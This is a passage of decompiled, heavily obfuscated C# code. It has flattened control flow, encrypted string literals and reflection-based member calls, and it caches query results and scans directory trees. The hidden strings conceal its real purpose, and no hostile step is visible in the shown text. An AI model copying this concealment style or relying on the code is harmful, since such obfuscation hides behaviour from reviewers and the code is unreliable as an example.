			IL_0180:
			val2 = val;
			num3 = --450673104;
			goto IL_0123;
		}

		public Dictionary<string, object> array286 (string queue88, params string[] message36)
		{
			string text874 = default(string);
			string[] array8363 = default(string[]);
			int num4 = default(int);
			Dictionary<string, object> dictionary = default(Dictionary<string, object>);
			string[] array8362 = default(string[]);
			object value = default(object);
			string from = default(string);
			string text873 = default(string);
			object obj3 = default(object);
			object current615 = default(object);
			while (true) {
				int num = --1009105377;
				while (true) {
					uint num2;
					switch ((num2 = (uint)(num ^ 0x19B30D20)) % 19) {
					case 5u:
						break;
					default:
						num = 1009105377;
						continue;
					case 6u:
						text874 = array8363 [num4];
						num = ~-1087980905;
						continue;
					case 3u:
						return dictionary;
					case 4u:
						return dictionary;
					case 7u:
						num = ((array8362.Length != 0) ? ((int)num2 + -453495672) : ((int)(0 - num2) ^ -560647596));
						continue;
					case 9u:
						num = (int)(num2 + 73437554);
						continue;
					case 14u:
						num = ((message36 != null) ? ((int)(0 - num2) ^ -257875498) : ((int)(0 - num2) ^ -2013413360));
						continue;
					case 2u:
						array8363 = message36;
						num = (int)(~num2 + 1797994155);
						continue;
					case 18u:
						dictionary = new Dictionary<string, object> ();
						num = (int)(~num2) ^ -1286139670;
						continue;
					case 8u:
						dictionary [text874] = value;
						num = (int)num2 - -35201926;
						continue;
					case 17u:
						array8362 = message36.Where ((string code72) => !message490.ContainsKey (from + flag6144.0e291526dfde44109a60e580c474e7dd ("3d973cf5b6035") + code72)).ToArray ();
						num = ~-496984883;
						continue;
					case 11u: {
						string key = from + flag6144.0e291526dfde44109a60e580c474e7dd ("1e94d6165ceb5") + text874;
						num = (int)((!message490.TryGetValue (key, out value)) ? (num2 + 507290287) : (num2 ^ 0x35548219));
						continue;
					}
					case 10u:
						from = queue88;
						num = (int)(~num2 + 686982305);
						continue;
					case 1u:
						num4 = 0;
						num = (int)(~num2) ^ -562890696;
						continue;
					case 12u:
						num = ((num4 < array8363.Length) ? 1575065930 : (--1552448052));
						continue;
					case 13u:
						num = ((message36.Length == 0) ? ((int)(~num2) ^ -1861217511) : ((int)num2 + -1149396514));
						continue;
					case 16u:
						num = ((right72 == null) ? ((int)(num2 ^ 0x794BB88C)) : ((int)(0 - num2) ^ -419072580));
						continue;
					case 15u:
						num4 += flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("4b49b6bb08bb5910f9f");
						num = 1272209617;
						continue;
					case 0u: {
						object obj;
						try {
							Type type = right72.GetType ();
							string name = flag6144.0e291526dfde44109a60e580c474e7dd ("be81b5e21600513998a3c1f0ce165");
							int invokeAttr = flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("c9b1a0d861efe5484ee");
							object target2354 = right72;
							object[] array8361 = new object[flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("ad79d398e092293ba6f")];
							array8361 [0] = flag6144.0e291526dfde44109a60e580c474e7dd ("e96f93c93dd10f473cb31f68d") + string.Join (flag6144.0e291526dfde44109a60e580c474e7dd ("468d8f9ba33cb9f"), array8362) + flag6144.0e291526dfde44109a60e580c474e7dd ("d9ab1083f2f8fe7ac3e36b7") + from;
							obj = type.InvokeMember (name, (BindingFlags)invokeAttr, null, target2354, array8361);
						} catch {
							return dictionary;
						}
						if (obj == null) {
							return dictionary;
						}
						IEnumerator enumerator = ((IEnumerable)obj).GetEnumerator ();
						try {
							while (true) {
								IL_0320:
								int num3 = (enumerator.MoveNext () ? (--1895958456) : 1383238373);
								while (true) {
									switch ((num2 = (uint)(~num3 + -1591921654)) % 11) {
									case 5u:
										num3 = 1895958456;
										continue;
									default:
										num3 = 1895958456;
										continue;
									case 8u:
										num3 = ((num4 < array8363.Length) ? (--877764918) : 587214359);
										continue;
									case 1u:
										num3 = (int)(num2 ^ 0xF54F58C);
										continue;
									case 0u:
										break;
									case 9u:
										dictionary [text873] = obj3;
										message490 [from + flag6144.0e291526dfde44109a60e580c474e7dd ("474377fcdfd9e") + text873] = obj3;
										num3 = (int)num2 + -2033955417;
										continue;
									case 4u:
										goto end_IL_02b7;
									case 2u:
										text873 = array8363 [num4];
										num3 = (dictionary.ContainsKey (text873) ? (~1830556266) : (~-1093489941));
										continue;
									case 6u:
										obj3 = status815 (current615, text873);
										num3 = (int)((obj3 == null) ? (~num2 ^ 0x32F3CC9F) : (~num2 ^ 0x34EDB511));
										continue;
									case 7u:
										num4 += flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("0c9f9f552540337c230");
										num3 = --2131457264;
										continue;
									case 3u:
										current615 = enumerator.Current;
										array8363 = array8362;
										num4 = 0;
										num3 = 817738381;
										continue;
									case 10u:
										goto end_IL_02b7;
									}
									goto IL_0320;
									continue;
									end_IL_02b7:
									break;
								}
								break;
							}
						} finally {
							IDisposable disposable = enumerator as IDisposable;
							while (true) {
								IL_0418:
								int num5 = ~692536199;
								while (true) {
									num2 = (uint)((num5 ^ 0x5061990A) - 1985355723);
									switch (num2 % 4) {
									case 0u:
										break;
									default:
										num5 = -692536200;
										continue;
									case 3u:
										num5 = ((disposable != null) ? ((int)num2 + -1478476801) : ((int)(0 - num2) + -1639605774));
										continue;
									case 1u:
										disposable.Dispose ();
										num5 = (int)(num2 + 471194474);
										continue;
									case 2u:
										goto end_IL_041e;
									}
									goto IL_0418;
									continue;
									end_IL_041e:
									break;
								}
								break;
							}
						}
						return dictionary;
					}
					}
					break;
				}
			}
		}

		public output911 name72<output911> (Dictionary<string, object> speed71, string amount2500)
		{
			if (speed71 != null) {
				goto IL_0006;
			}
			goto IL_0162;
			IL_0006:
			int num = ~681765074;
			goto IL_000c;
			IL_000c:
			Type type = default(Type);
			output911 result2 = default(output911);
			output911 result = default(output911);
			object value = default(object);
			IEnumerable enumerable = default(IEnumerable);
			while (true) {
				uint num2 = (uint)(num - -1249354332);
				switch (num2 % 13) {
				case 3u:
					break;
				default:
					num = -681765075;
					continue;
				case 8u:
					goto IL_005a;
				case 7u:
					goto IL_006f;
				case 2u:
					type = typeof(output911).GetElementType () ?? typeof(object);
					num = -948098724;
					continue;
				case 0u:
					return result2;
				case 10u:
					goto IL_00c2;
				case 5u:
					goto IL_00e0;
				case 1u:
					goto IL_00fc;
				case 9u:
					result = (output911)value;
					num = (int)num2 - -1998427796;
					continue;
				case 4u:
					goto IL_0135;
				case 6u:
					return result;
				case 12u:
					goto IL_0162;
				case 11u:
					goto IL_0174;
				}
				break;
				IL_0135:
				enumerable = value as IEnumerable;
				if (enumerable != null) {
					num = (int)(~num2 + 63082092);
					continue;
				}
				goto IL_0254;
				IL_005a:
				if (!(value is string)) {
					num = (int)(num2 - 889125967);
					continue;
				}
				goto IL_0254;
				IL_00fc:
				num = (int)((!speed71.TryGetValue (amount2500, out value)) ? (~num2 + 230486889) : (num2 - 1583854791));
				continue;
				IL_006f:
				num = ((value == null) ? ((int)(~num2) + -104013570) : ((int)(num2 + 309227132)));
				continue;
				IL_00c2:
				if (typeof(output911).IsArray) {
					num = 581314497;
					continue;
				}
				goto IL_02c6;
				IL_00e0:
				num = ((!(value is output911)) ? (--167177275) : (-115487368));
			}
			goto IL_0006;
			IL_02c6:
			IEnumerable enumerable2 = value as IEnumerable;
			int num3 = ~-481053087;
			goto IL_01dd;
			IL_0162:
			result2 = default(output911);
			num = -456103757;
			goto IL_000c;
			IL_0174:
			List<object> list839 = new List<object> ();
			foreach (object item in enumerable) {
				if (item != null) {
					try {
						list839.Add (Convert.ChangeType (item, type));
					} catch {
					}
				}
			}
			Array array8361 = Array.CreateInstance (type, list839.Count);
			goto IL_01d8;
			IL_01d8:
			num3 = 812304722;
			goto IL_01dd;
			IL_0254:
			Array array8362 = Array.CreateInstance (type, flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("4898465fba4cbbe719f"));
			array8362.SetValue (Convert.ChangeType (value, type), 0);
			return (output911)(object)array8362;
			IL_01dd:
			int num4 = default(int);
			object current616 = default(object);
			while (true) {
				uint num2;
				switch ((num2 = (uint)(num3 - -108384920)) % 10) {
				case 0u:
					break;
				default:
					num3 = 812304722;
					continue;
				case 2u:
					num4 = 0;
					num3 = (int)(num2 ^ 0x28131E04);
					continue;
				case 7u:
					array8361.SetValue (list839 [num4], num4);
					num4 += flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("0d985572ef61a06489c");
					num3 = --519276014;
					continue;
				case 1u:
					goto IL_0254;
				case 6u:
					goto IL_0284;
				case 9u:
					goto IL_0298;
				case 3u:
					return (output911)(object)array8361;
				case 8u:
					goto IL_02c6;
				case 4u:
					goto IL_02d8;
				case 5u:
					goto IL_02f7;
				}
				break;
				IL_02f7:
				IEnumerator enumerator2 = enumerable2.GetEnumerator ();
				try {
					while (true) {
						IL_036c:
						int num5 = (enumerator2.MoveNext () ? (-233544830) : (-1164283381));
						while (true) {
							switch ((num2 = (uint)(num5 ^ -522842048)) % 7) {
							case 0u:
								num5 = ~233544829;
								continue;
							default:
								num5 = -233544830;
								continue;
							case 3u:
								current616 = enumerator2.Current;
								num5 = -1934593764;
								continue;
							case 6u:
								result2 = (output911)Convert.ChangeType (current616, typeof(output911));
								num5 = (int)num2 + -1466632712;
								continue;
							case 5u:
								break;
							case 4u:
								goto end_IL_0307;
							case 1u:
								num5 = (int)((current616 == null) ? (0 - num2 + 1501259888) : (~num2 ^ 0x7A409447));
								continue;
							case 2u:
								goto IL_041e;
							}
							goto IL_036c;
							continue;
							end_IL_0307:
							break;
						}
						break;
					}
				} finally {
					IDisposable disposable = enumerator2 as IDisposable;
					while (true) {
						IL_03c3:
						int num6 = -1714204306;
						while (true) {
							switch ((num2 = (uint)(num6 - 878004657)) % 4) {
							case 0u:
								break;
							default:
								num6 = -1714204306;
								continue;
							case 1u:
								num6 = ((disposable != null) ? ((int)(~num2) + -19233598) : ((int)(num2 - 182818762)));
								continue;
							case 3u:
								disposable.Dispose ();
								num6 = (int)(~num2) ^ -1067408545;
								continue;
							case 2u:
								goto end_IL_03c8;
							}
							goto IL_03c3;
							continue;
							end_IL_03c8:
							break;
						}
						break;
					}
				}
				goto IL_04a0;
				IL_041e:
				return default(output911);
				IL_02d8:
				num3 = ((num4 >= list839.Count) ? (--1422379923) : 121931487);
				continue;
				IL_0284:
				if (enumerable2 != null) {
					num3 = (int)(~num2) ^ -1269167254;
					continue;
				}
				goto IL_042a;
				IL_04a0:
				return result2;
				IL_0298:
				if (!(value is string)) {
					num3 = (int)(num2 ^ 0x7424FD1E);
					continue;
				}
				goto IL_042a;
				IL_042a:
				try {
					if (value is IConvertible) {
						goto IL_0432;
					}
					goto IL_0481;
					IL_0432:
					int num7 = -1884855504;
					goto IL_0437;
					IL_0437:
					while (true) {
						switch ((num2 = (uint)(num7 ^ -1443509373)) % 4) {
						case 0u:
							break;
						default:
							num7 = -1884855504;
							continue;
						case 3u:
							result2 = (output911)Convert.ChangeType (value, typeof(output911));
							goto end_IL_042a;
						case 1u:
							goto IL_0481;
						case 2u:
							goto end_IL_042a;
						}
						break;
					}
					goto IL_0432;
					IL_0481:
					result2 = (output911)value;
					num7 = -1083543559;
					goto IL_0437;
					end_IL_042a:;
				} catch {
					result2 = default(output911);
				}
				goto IL_04a0;
			}
			goto IL_01d8;
		}

		private min208 text01<min208> (object result22, string limit7168)
		{
			Type type = typeof(min208).GetElementType () ?? typeof(object);
			IEnumerator enumerator = ((IEnumerable)result22).GetEnumerator ();
			min208 result23 = default(min208);
			try {
				object obj = default(object);
				List<object> list839 = default(List<object>);
				Array array8361 = default(Array);
				int num4 = default(int);
				while (true) {
					IL_023f:
					if (enumerator.MoveNext ()) {
						IEnumerable enumerable;
						while (true) {
							obj = status815 (enumerator.Current, limit7168);
							enumerable = obj as IEnumerable;
							int num = -1405705069;
							while (true) {
								uint num2 = (uint)(num + -1661976698);
								switch (num2 % 5) {
								case 0u:
									num = -1771025407;
									continue;
								default:
									num = -1771025407;
									continue;
								case 2u:
									break;
								case 4u:
									goto IL_0076;
								case 1u:
									goto end_IL_0034;
								case 3u:
									goto end_IL_0087;
								}
								if (!(obj is string)) {
									num = (int)num2 ^ -86317667;
									continue;
								}
								goto IL_020c;
								IL_0076:
								if (enumerable != null) {
									num = (int)((0 - num2) ^ 0x95EBB36);
									continue;
								}
								goto IL_020c;
								continue;
								end_IL_0034:
								break;
							}
							continue;
							end_IL_0087:
							break;
						}
						list839 = new List<object> ();
						IEnumerator enumerator2 = enumerable.GetEnumerator ();
						try {
							while (enumerator2.MoveNext ()) {
								object current615 = enumerator2.Current;
								if (current615 != null) {
									try {
										list839.Add (Convert.ChangeType (current615, type));
									} catch {
									}
								}
							}
						} finally {
							IDisposable disposable = enumerator2 as IDisposable;
							while (true) {
								IL_00e9:
								int num3 = -689033343;
								while (true) {
									uint num2;
									switch ((num2 = (uint)(-num3 ^ 0xB85E431)) % 4) {
									case 0u:
										break;
									default:
										num3 = -689033343;
										continue;
									case 2u:
										num3 = (int)((disposable == null) ? ((0 - num2) ^ 0x789E2E94) : (num2 - 1956430158));
										continue;
									case 1u:
										disposable.Dispose ();
										num3 = (int)num2 ^ -59208681;
										continue;
									case 3u:
										goto end_IL_00ee;
									}
									goto IL_00e9;
									continue;
									end_IL_00ee:
									break;
								}
								break;
							}
						}
						array8361 = Array.CreateInstance (type, list839.Count);
						num4 = 0;
						goto IL_0254;
					}
					int num5 = 1138379974;
					goto IL_0161;
					IL_0254:
					num5 = ((num4 < list839.Count) ? (-1698024638) : (--1492552521));
					goto IL_0161;
					IL_020c:
					num5 = ((obj != null) ? 1505123172 : (--1211232386));
					goto IL_0161;
					IL_0161:
					while (true) {
						uint num2 = (uint)((num5 ^ 0x66C2263B) - -744693756);
						switch (num2 % 10) {
						case 4u:
							num5 = ~1698024637;
							continue;
						default:
							num5 = -1698024638;
							continue;
						case 5u: {
							Array array8362 = Array.CreateInstance (type, flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("0d9a9f00251706e9c52"));
							array8362.SetValue (Convert.ChangeType (obj, type), 0);
							result23 = (min208)(object)array8362;
							break;
						}
						case 3u:
							break;
						case 7u:
							array8361.SetValue (list839 [num4], num4);
							num5 = --717028177;
							continue;
						case 6u:
							goto IL_020c;
						case 0u:
							num4 += flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("f9e5549beed9d37cb3f");
							num5 = (int)num2 + -140184095;
							continue;
						case 9u:
							goto IL_023f;
						case 8u:
							goto IL_0254;
						case 2u:
							result23 = (min208)(object)array8361;
							num5 = (int)(0 - num2) + -140319954;
							continue;
						case 1u:
							goto IL_02f0;
						}
						break;
					}
					break;
				}
			} finally {
				IDisposable disposable = enumerator as IDisposable;
				while (true) {
					IL_0294:
					int num6 = --1460580013;
					while (true) {
						uint num2;
						switch ((num2 = (uint)(num6 - -173763396)) % 4) {
						case 3u:
							break;
						default:
							num6 = 1460580013;
							continue;
						case 1u:
							num6 = ((disposable == null) ? ((int)(num2 ^ 0x446E8297)) : ((int)(~num2) ^ -275617086));
							continue;
						case 0u:
							disposable.Dispose ();
							num6 = (int)(~num2) ^ -1583768439;
							continue;
						case 2u:
							goto end_IL_029a;
						}
						goto IL_0294;
						continue;
						end_IL_029a:
						break;
					}
					break;
				}
			}
			return result23;
			IL_02f0:
			return (min208)(object)Array.CreateInstance (type, 0);
		}

		private total978 right48<total978> (object session164, string text15)
		{
			IEnumerator enumerator = ((IEnumerable)session164).GetEnumerator ();
			try {
				List<object> list839 = default(List<object>);
				Type type = default(Type);
				total978 result = default(total978);
				IEnumerable enumerable = default(IEnumerable);
				object current616 = default(object);
				object current617 = default(object);
				while (enumerator.MoveNext ()) {
					object current615 = enumerator.Current;
					try {
						object obj = status815 (current615, text15);
						if (obj == null) {
							goto IL_0026;
						}
						goto IL_010b;
						IL_0026:
						int num = ~-1815630857;
						goto IL_002c;
						IL_002c:
						while (true) {
							IEnumerator enumerator2;
							uint num2;
							switch ((num2 = (uint)(num + -341020534)) % 11) {
							case 4u:
								break;
							default:
								num = 1815630856;
								continue;
							case 7u:
								list839 = new List<object> ();
								num = (int)(num2 ^ 0x23EA983B);
								continue;
							case 2u:
								type = typeof(total978).GetElementType () ?? typeof(object);
								num = -1908728261;
								continue;
							case 5u:
								if (typeof(total978).IsArray) {
									num = (int)(0 - num2) + -919992986;
									continue;
								}
								goto IL_02c5;
							case 3u: {
								total978 val = (total978)obj;
								result = val;
								num = (int)num2 - -270579287;
								continue;
							}
							case 6u:
								goto end_IL_0018;
							case 0u:
								if (!(obj is string)) {
									num = (int)(num2 ^ 0x3329A72D);
									continue;
								}
								goto IL_03a1;
							case 1u:
								goto IL_010b;
							case 8u:
								enumerable = obj as IEnumerable;
								if (enumerable != null) {
									num = 1591539683;
									continue;
								}
								goto IL_03a1;
							case 10u: {
								{
									enumerator2 = enumerable.GetEnumerator ();
									try {
										while (true) {
											IL_0192:
											int num3 = ((!enumerator2.MoveNext ()) ? 1652140247 : 286953552);
											while (true) {
												switch ((num2 = (uint)(num3 ^ 0x3835165D)) % 6) {
												case 3u:
													num3 = 286953552;
													continue;
												default:
													num3 = 286953552;
													continue;
												case 4u:
													break;
												case 5u:
													num3 = ((current616 == null) ? ((int)(~num2) ^ -452271753) : ((int)(num2 - 1209540300)));
													continue;
												case 0u:
													list839.Add (Convert.ChangeType (current616, type));
													num3 = (int)(num2 ^ 0x6AE8E981);
													continue;
												case 1u:
													current616 = enumerator2.Current;
													num3 = ~-1947305551;
													continue;
												case 2u:
													goto end_IL_0162;
												}
												goto IL_0192;
												continue;
												end_IL_0162:
												break;
											}
											break;
										}
									} finally {
										IDisposable disposable2 = enumerator2 as IDisposable;
										if (disposable2 != null) {
											disposable2.Dispose ();
										}
									}
								}
								Array array8361 = Array.CreateInstance (type, list839.Count);
								int num4 = 0;
								while (true) {
									int num5 = ((num4 < list839.Count) ? (~10578535) : (~-1290374226));
									while (true) {
										num2 = (uint)(num5 + 307936839);
										switch (num2 % 6) {
										case 5u:
											num5 = -10578536;
											continue;
										default:
											num5 = -10578536;
											continue;
										case 1u:
											array8361.SetValue (list839 [num4], num4);
											num4 += flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("7f4bcaf9f90118aab9e");
											num5 = ~-1750883458;
											continue;
										case 2u:
											result = (total978)(object)array8361;
											num5 = (int)(~num2) ^ -344120065;
											continue;
										case 0u:
											break;
										case 3u:
											goto end_IL_0293;
										case 4u:
											goto IL_02c5;
										}
										break;
									}
									continue;
									end_IL_0293:
									break;
								}
								goto end_IL_0018;
							}
							case 9u:
								goto IL_0428;
								IL_02c5:
								enumerator2 = enumerable.GetEnumerator ();
								try {
									while (true) {
										IL_032a:
										int num6 = ((!enumerator2.MoveNext ()) ? (-68275165) : (-1633362538));
										while (true) {
											num2 = (uint)(num6 ^ -959181666);
											switch (num2 % 7) {
											case 4u:
												num6 = -1633362538;
												continue;
											default:
												num6 = -1633362538;
												continue;
											case 1u:
												current617 = enumerator2.Current;
												num6 = -755528593;
												continue;
											case 5u:
												goto end_IL_02d5;
											case 0u:
												break;
											case 6u:
												result = (total978)Convert.ChangeType (current617, typeof(total978));
												num6 = (int)(0 - num2 + 135940279);
												continue;
											case 3u:
												num6 = ((current617 != null) ? ((int)((0 - num2) ^ 0x423BB26C)) : ((int)(0 - num2) + -1715715513));
												continue;
											case 2u:
												goto IL_03a1;
											}
											goto IL_032a;
											continue;
											end_IL_02d5:
											break;
										}
										break;
									}
								} finally {
									IDisposable disposable3 = enumerator2 as IDisposable;
									if (disposable3 != null) {
										disposable3.Dispose ();
									}
								}
								goto end_IL_0018;
								IL_03a1:
								try {
									if (!(obj is IConvertible)) {
										goto IL_0409;
									}
									while (true) {
										int num7 = -879570664;
										while (true) {
											num2 = (uint)(num7 ^ -614962990);
											switch (num2 % 4) {
											case 3u:
												break;
											default:
												num7 = -879570664;
												continue;
											case 2u:
												result = (total978)Convert.ChangeType (obj, typeof(total978));
												num7 = (int)num2 ^ -1986072175;
												continue;
											case 1u:
												goto end_IL_03a9;
											case 0u:
												goto IL_0409;
											}
											break;
										}
										continue;
										end_IL_03a9:
										break;
									}
									goto end_IL_03a1;
									IL_0409:
									result = (total978)obj;
									end_IL_03a1:;
								} catch {
									result = default(total978);
								}
								goto end_IL_0018;
							}
							break;
						}
						goto IL_0026;
						IL_010b:
						num = ((obj is total978) ? (--1938457466) : 447524566);
						goto IL_002c;
						end_IL_0018:;
					} catch {
						continue;
					}
					return result;
					IL_0428:;
				}
			} finally {
				IDisposable disposable = enumerator as IDisposable;
				while (true) {
					IL_043d:
					int num8 = -1253846968;
					while (true) {
						uint num2 = (uint)(num8 + -1949034815);
						switch (num2 % 4) {
						case 3u:
							break;
						default:
							num8 = -1253846968;
							continue;
						case 1u:
							num8 = ((disposable == null) ? ((int)num2 - -2055866240) : ((int)(num2 + 2115688098)));
							continue;
						case 0u:
							disposable.Dispose ();
							num8 = (int)(~num2 ^ 0xF58C51A);
							continue;
						case 2u:
							goto end_IL_0442;
						}
						goto IL_043d;
						continue;
						end_IL_0442:
						break;
					}
					break;
				}
			}
			return default(total978);
		}

		private static object status815 (object offset076, string avg0675)
		{
			try {
				return offset076.GetType ().InvokeMember (avg0675, (BindingFlags)flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("63ab05356b4d38efa9c"), null, offset076, null);
			} catch {
				return null;
			}
		}
	}
}
namespace status7737
{
	public class list838
	{
		public static List<stream8120> stream20 (List<output47> options39, List<row24> name01)
		{
			List<stream8120> list839 = new List<stream8120> ();
			status423 speed = default(status423);
			status423 position292 = default(status423);
			stream8120 stream8121 = default(stream8120);
			foreach (row24 item4708 in name01) {
				if (!item4708.previous95) {
					continue;
				}
				using List<width422>.Enumerator enumerator2 = item4708.format5368.GetEnumerator ();
				while (enumerator2.MoveNext ()) {
					string text873;
					string text874;
					string text875;
					status423 item4707;
					while (true) {
						string fullName = enumerator2.Current.column158.FullName;
						string[] array8361 = new string[flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("2e981a42a0561523032")];
						array8361 [0] = flag6144.0e291526dfde44109a60e580c474e7dd ("ac6ce094bee283df014fbb349b1b0290a7c8694290f72e548ac9776d199");
						text873 = position151.child530 (fullName, array8361);
						string[] array8362 = new string[flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("f959e8c5f2fed479ab7")];
						array8362 [0] = flag6144.0e291526dfde44109a60e580c474e7dd ("6e4c1f92d50e6baea1e5fa904999c");
						text874 = position151.child530 (fullName, array8362);
						string[] array8363 = new string[flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("6e96be652e749fdf39e")];
						array8363 [0] = flag6144.0e291526dfde44109a60e580c474e7dd ("e909a67ae4924b9af24eafa9081d9fc62a47902e3073e130e43173df9");
						text875 = position151.child530 (fullName, array8363);
						item4707 = new status423 (text873, flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("1c9a8d00371550ed41d"));
						int num = --753114882;
						while (true) {
							uint num2;
							switch ((num2 = (uint)(~num + -1519436982)) % 4) {
							case 0u:
								num = ~-1842238553;
								continue;
							default:
								num = 1842238552;
								continue;
							case 1u:
								break;
							case 3u:
								speed = new status423 (text874, flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("5d019f82991bd8b079d"));
								position292 = new status423 (text875, flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("e9823314c7c58f225df"));
								num = (int)num2 ^ -52816688;
								continue;
							case 2u:
								goto end_IL_0065;
							}
							break;
						}
						continue;
						end_IL_0065:
						break;
					}
					using List<output47>.Enumerator enumerator3 = options39.GetEnumerator ();
					while (true) {
						IL_01d4:
						int num3 = (enumerator3.MoveNext () ? 1660590593 : (--1967672371));
						while (true) {
							uint num2 = (uint)(num3 - -151729120);
							switch (num2 % 6) {
							case 0u:
								num3 = 1660590593;
								continue;
							default:
								num3 = 1660590593;
								continue;
							case 2u:
								stream8121.array6599 = item4708;
								list839.Add (stream8121);
								num3 = (int)(num2 ^ 0x7D67250D);
								continue;
							case 4u:
								num3 = (int)((stream8121 != null) ? (num2 ^ 0x11858D8E) : (num2 ^ 0x55F7DCA3));
								continue;
							case 3u:
								stream8121 = path778 (enumerator3.Current, text873, item4707, text874, speed, text875, position292);
								num3 = ~-1084059715;
								continue;
							case 1u:
								break;
							case 5u:
								goto end_IL_014a;
							}
							goto IL_01d4;
							continue;
							end_IL_014a:
							break;
						}
						break;
					}
				}
			}
			return list839;
		}

		private static stream8120 path778 (output47 error645, string format134, status423 item3861, string code8854, status423 speed18, string previous6279, status423 position79)
		{
			stream8120 stream8121 = new stream8120 (error645.end824);
			string text873 = default(string);
			while (true) {
				int num = ~-1433793466;
				while (true) {
					uint num2 = (uint)(num + -778414024);
					switch (num2 % 15) {
					case 10u:
						break;
					default:
						num = 1433793465;
						continue;
					case 6u:
						num = (error645.max59 ? (-1493847807) : 1290858431);
						continue;
					case 4u:
						num = ((!item3861.args65 (error645.end824)) ? ((int)(num2 ^ 0x406E61D4)) : ((int)num2 + -1584968182));
						continue;
					case 5u: {
						string[] array8362 = new string[flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("f96fde6c6cdb41e4434")];
						array8362 [0] = text873;
						stream8121.config071 = new DirectoryInfo (position151.child530 (code8854, array8362));
						num = (int)(0 - num2) ^ -1165656413;
						continue;
					}
					case 11u:
						num = (error645.end36 ? ((int)(~num2) ^ -142578133) : ((int)num2 - -441714584));
						continue;
					case 8u: {
						string[] array8363 = new string[flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("ae55ffcafb9e958ec95")];
						array8363 [0] = error645.end824;
						stream8121.child48 = new DirectoryInfo (position151.child530 (previous6279, array8363));
						num = (int)num2 - -1024241693;
						continue;
					}
					case 7u:
						num = ((!error645.session3394) ? (-1630211505) : 1025780932);
						continue;
					case 9u: {
						string[] array8361 = new string[flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("1f9b0f61b5799050635")];
						array8361 [0] = error645.end824;
						stream8121.width021 = new DirectoryInfo (position151.child530 (format134, array8361));
						num = (int)(num2 ^ 0x354F8B16);
						continue;
					}
					case 14u:
						num = ((stream8121.config071 != null) ? ((int)(num2 - 313688817)) : ((int)(0 - num2) + -927739436));
						continue;
					case 3u:
						num = ((!position79.args65 (error645.end824)) ? ((int)(num2 - 1877578413)) : ((int)(0 - num2) + -1628672266));
						continue;
					case 12u:
						num = ((stream8121.width021 == null) ? (-1541724238) : 1661140217);
						continue;
					case 0u:
						text873 = flag6144.0e291526dfde44109a60e580c474e7dd ("1e98727a45082df71bbd31718b8bbfca1f7dca18cda60") + error645.end824 + flag6144.0e291526dfde44109a60e580c474e7dd ("e92c6a59120e49f2c37505ceaee05a4bf320971b252ee6eb3c8");
						num = ((!speed18.args65 (text873)) ? ((int)(0 - num2) ^ -878765704) : ((int)(0 - num2) + -1333780507));
						continue;
					case 2u:
						num = (int)((stream8121.child48 != null) ? (num2 + 1047155415) : (num2 ^ 0x40873A87));
						continue;
					case 1u:
						return null;
					case 13u:
						return stream8121;
					}
					break;
				}
			}
		}
	}
}
namespace input7585
{
	public class message54
	{
		public static dict7207 dict1921 (List<DirectoryInfo> node06)
		{
			dict7207 dict7208 = new dict7207 ();
			using List<DirectoryInfo>.Enumerator enumerator = node06.GetEnumerator ();
			string name2 = default(string);
			string name = default(string);
			status423 current617 = default(status423);
			while (enumerator.MoveNext ()) {
				while (true) {
					IL_0088:
					status423 status747 = new status423 (enumerator.Current, flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("8e10caa6279d201a5ad"));
					int num = 552501601;
					while (true) {
						uint num2;
						switch ((num2 = (uint)(num ^ 0x72205C31)) % 6) {
						case 5u:
							num = --1808238260;
							continue;
						default:
							num = 1808238260;
							continue;
						case 2u:
							break;
						case 0u:
							max695 (status747, dict7208);
							num = ~-475800147;
							continue;
						case 1u:
							goto IL_0088;
						case 4u:
							goto IL_00a9;
						case 3u:
							goto IL_00df;
						}
						break;
						IL_00a9:
						num = ((!status747.path1429.Name.tree13 (flag6144.0e291526dfde44109a60e580c474e7dd ("bcdb60067b09b9324fa7bd693"))) ? ((int)(0 - num2) + -1104245589) : ((int)num2 + -614212169));
					}
					dict7208.key99.Add (new settings7294 (status747.path1429.Name, status747.path1429));
					break;
					IL_00df:
					using (IEnumerator<status423> enumerator2 = status747.level10.GetEnumerator ()) {
						while (enumerator2.MoveNext ()) {
							while (true) {
								status423 current615 = enumerator2.Current;
								if (current615.path1429.Name.time0110 (flag6144.0e291526dfde44109a60e580c474e7dd ("bdd43e85b596485edea"))) {
									break;
								}
								int num3 = --283195603;
								while (true) {
									uint num2;
									switch ((num2 = (uint)(num3 ^ 0x16D4D584)) % 13) {
									case 0u:
										num3 = --1459788212;
										continue;
									default:
										num3 = 1459788212;
										continue;
									case 2u:
										break;
									case 6u:
										goto IL_0166;
									case 12u:
										max695 (current615, dict7208);
										num3 = 776465965;
										continue;
									case 4u:
										dict7208.key99.Add (new settings7294 (current615.path1429.Name, current615.path1429));
										goto end_IL_0270;
									case 10u:
										dict7208.child3855.Add (current615.path1429);
										num3 = 116994390;
										continue;
									case 11u:
										dict7208.date71.Add (new settings7294 (current615.path1429.FullName, current615.path1429));
										num3 = (int)(num2 - 583713633);
										continue;
									case 3u:
										goto IL_0243;
									case 9u:
										goto end_IL_00f6;
									case 5u:
										goto IL_02b5;
									case 1u: {
										using (IEnumerator<status423> enumerator3 = current615.level10.GetEnumerator ()) {
											while (enumerator3.MoveNext ()) {
												while (true) {
													status423 current616 = enumerator3.Current;
													int num4 = --611411949;
													while (true) {
														num2 = (uint)(-num4 ^ -893712311);
														switch (num2 % 13) {
														case 12u:
															num4 = 1608030823;
															continue;
														default:
															num4 = 1608030823;
															continue;
														case 1u:
															break;
														case 2u:
															goto IL_0372;
														case 3u:
